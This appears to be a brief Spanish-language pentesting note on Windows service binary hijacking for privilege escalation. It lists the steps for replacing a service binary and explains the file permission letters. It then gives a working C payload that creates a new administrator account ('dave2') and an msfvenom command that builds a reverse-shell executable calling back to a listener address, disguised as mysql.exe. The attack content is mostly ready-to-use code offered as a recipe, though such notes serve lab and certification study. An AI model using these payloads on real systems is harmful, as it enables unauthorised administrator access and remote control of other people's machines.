---
tags: [privesc, windows, binary]
---

# Binary Hijacking

## Pasos

1. Revisar servicios en ejecución
2. Revisar permisos en binarios sospechosos
3. Crear binario malicioso y compilar
4. Reiniciar el servicio (o la máquina si no hay permisos)

```
F → Full access
M → Modify access
RX → Read and execute
R → Read-only
W → Write-only
```

## Payload — Crear Usuario

```c
#include <stdlib.h>
int main() {
    system("net user dave2 password123! /add");
    system("net localgroup administrators dave2 /add");
    return 0;
}
```

## Compilar

```bash
# Usuario
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.180 LPORT=9001 -f exe > mysql.exe
```

